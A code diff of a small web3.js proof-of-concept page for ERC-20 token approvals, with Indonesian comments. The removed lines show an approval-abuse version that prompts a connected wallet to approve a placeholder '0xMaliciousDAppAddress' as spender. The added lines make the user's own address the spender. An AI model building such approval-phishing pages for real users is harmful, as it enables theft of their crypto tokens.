@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Token Approval Abuse</title>
+    <title>Token Approval PoC</title>
     <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
 </head>
 <body>
-    <h1>Token Approval PoC</h1>
+    <h1>Token Approval PoC (Tanpa `getTokenList`)</h1>
     <button id="approve">Approve Token</button>
     <p id="status" style="color: red; font-weight: bold;"></p>
 
@@ -14,12 +14,18 @@
 
         document.getElementById('approve').onclick = async () => {
             try {
+                // Menghubungkan wallet
                 document.getElementById('status').innerText = "Connecting to wallet...";
                 const accounts = await web3.eth.requestAccounts();
-                document.getElementById('status').innerText = "Wallet connected: " + accounts[0];
+                const userAddress = accounts[0]; // Alamat pengguna yang terhubung
+                document.getElementById('status').innerText = "Wallet connected: " + userAddress;
 
+                // Gunakan alamat kontrak token ERC-20 yang sudah diketahui
+                const tokenAddress = "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"; // Ganti dengan alamat token yang valid
+                const spenderAddress = userAddress; // Menggunakan alamat pengguna sendiri sebagai spender
+
+                // ABI standar ERC-20 hanya dengan fungsi approve
                 const tokenContract = new web3.eth.Contract(
-                    // ABI hanya dengan fungsi approve
                     [
                         {
                             "constant": false,
@@ -32,15 +38,15 @@
                             "type": "function"
                         }
                     ],
-                    "0x70c92148c5dd2051edc4f4663611a37984efcf81" // Ganti dengan alamat kontrak token
+                    tokenAddress // Gunakan alamat kontrak token yang valid
                 );
 
                 document.getElementById('status').innerText = "Sending approval transaction...";
                 await tokenContract.methods
-                    .approve("0xMaliciousDAppAddress", "1000000000000000000") // 1 token
-                    .send({ from: accounts[0] });
+                    .approve(spenderAddress, "1000000000000000000") // Approve 1 token
+                    .send({ from: userAddress });
 
-                alert("Approval successful! Token spender: 0xMaliciousDAppAddress");
+                alert("Approval successful!");
                 document.getElementById('status').innerText = "Approval successful!";
             } catch (err) {
                 alert("Error: " + err.message);
